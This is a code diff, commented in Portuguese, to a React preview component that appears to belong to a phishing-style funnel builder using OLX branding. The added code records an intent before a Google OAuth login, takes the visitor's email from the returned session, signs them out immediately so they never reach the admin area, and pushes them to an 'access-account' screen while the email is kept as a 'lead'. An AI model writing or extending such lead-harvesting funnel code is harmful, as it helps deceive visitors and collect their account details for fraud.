@@ -99,6 +99,63 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
     screensRef.current = screens ?? [];
   }, [screens]);
 
+  // Pós-retorno do Google OAuth: captura email, grava como lead e
+  // empurra a pessoa pra tela "access-account" (mesmo destino do
+  // fluxo manual). Em seguida desloga pra ela não cair no admin.
+  useEffect(() => {
+    if (!adId) return;
+    if (typeof window === "undefined") return;
+
+    let cancelled = false;
+    let raw: string | null = null;
+    try {
+      raw = localStorage.getItem("olx_google_funnel_intent");
+    } catch { return; }
+    if (!raw) return;
+
+    let intent: { adId?: string; sessionId?: string; returnUrl?: string; ts?: number } | null = null;
+    try { intent = JSON.parse(raw); } catch { /* ignore */ }
+    if (!intent || intent.adId !== adId) return;
+
+    // Expira em 10 min pra não disparar fora de contexto
+    if (intent.ts && Date.now() - intent.ts > 10 * 60 * 1000) {
+      try { localStorage.removeItem("olx_google_funnel_intent"); } catch { /* ignore */ }
+      return;
+    }
+
+    (async () => {
+      const { data: sessionData } = await supabase.auth.getSession();
+      const email = sessionData?.session?.user?.email?.trim();
+      if (cancelled) return;
+      try { localStorage.removeItem("olx_google_funnel_intent"); } catch { /* ignore */ }
+
+      // Desloga imediatamente — a pessoa não pode ficar logada no admin
+      if (sessionData?.session) {
+        try { await supabase.auth.signOut(); } catch { /* ignore */ }
+      }
+      if (cancelled || !email) return;
+
+      // Espera as telas carregarem antes de disparar a navegação
+      const waitForScreens = async () => {
+        for (let i = 0; i < 50; i++) {
+          if (screensRef.current.length > 0) return true;
+          await new Promise((r) => setTimeout(r, 100));
+        }
+        return screensRef.current.length > 0;
+      };
+      await waitForScreens();
+      if (cancelled) return;
+
+      // Reusa o handler de "access-account" do fluxo manual
+      window.postMessage(
+        { type: "iframe-help-action", action: "access-account", email },
+        "*",
+      );
+    })();
+
+    return () => { cancelled = true; };
+  }, [adId]);
+
   // Hidrata leads da sessão atual (pra placeholders {{lead.email}}) + escuta realtime.
   useEffect(() => {
     if (!adId) return;
@@ -330,8 +387,23 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
       if (data.type === "iframe-google-login") {
         (async () => {
           try {
+            // Marca intenção: ao voltar do Google, capturamos o email,
+            // gravamos como lead e seguimos pra tela "access-account"
+            // (mesmo destino do fluxo manual). Não deixamos a pessoa
+            // logada de verdade — fazemos signOut imediato no retorno.
+            try {
+              localStorage.setItem(
+                "olx_google_funnel_intent",
+                JSON.stringify({
+                  adId,
+                  sessionId: getSessionId(),
+                  returnUrl: window.location.href,
+                  ts: Date.now(),
+                }),
+              );
+            } catch { /* ignore */ }
             const result = await lovable.auth.signInWithOAuth("google", {
-              redirect_uri: window.location.origin,
+              redirect_uri: window.location.href,
             });
             if (result.error) {
               console.error("[PreviewFrame] google oauth erro:", result.error);
